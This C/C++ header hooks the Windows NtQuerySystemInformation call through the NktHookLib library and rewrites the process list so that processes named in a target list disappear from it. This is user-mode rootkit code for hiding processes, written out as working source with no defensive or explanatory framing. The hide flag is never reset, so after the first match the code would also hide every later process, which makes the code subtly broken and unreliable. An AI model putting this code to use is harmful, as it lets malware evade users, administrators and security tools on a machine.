#pragma once

NTSTATUS WINAPI MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);

void HookNtQuerySystemInformation()
{
	//hook NtQuerySystemInformation
	hNtdlldll = NktHookLibHelpers::GetModuleBaseAddress(L"Ntdll.dll");
	fnOrigNtQuerySystemInformation = NktHookLibHelpers::GetProcedureAddress(hNtdlldll, "NtQuerySystemInformation");
	//HMODULE hkm = LoadLibraryA("Kernel32.dll");
	//fnOrigNtQuerySystemInformation = GetProcAddress(hkm, "NtQuerySystemInformation");
	dwOsErr = cHookMgr.Hook(&(sNtQuerySystemInformation_Hook.nHookId), (LPVOID*)&(sNtQuerySystemInformation_Hook.fnNtQuerySystemInformation),
		fnOrigNtQuerySystemInformation, MyNtQuerySystemInformation,
		NKTHOOKLIB_DisallowReentrancy
		);
}

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

NTSTATUS WINAPI MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	bool ismyProtectedProcess = false;
	NTSTATUS Result =NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
		if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == Result)
		{
			PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
			PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;

			do
			{
				pCurrent = pNext;
				pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);

				for (size_t i = 0; i < targets_len; i++)
				{
					if (!wcsncmp(pNext->ImageName.Buffer, wtargets[i], pNext->ImageName.Length))
					{
						ismyProtectedProcess = true;
					}
				}

				if (ismyProtectedProcess)
				{
					if (0 == pNext->NextEntryOffset)
					{
						pCurrent->NextEntryOffset = 0;
					}
					else
					{
						pCurrent->NextEntryOffset += pNext->NextEntryOffset;
					}

					pNext = pCurrent;
				}
			} while (pCurrent->NextEntryOffset != 0);
		}



	return Result;
}
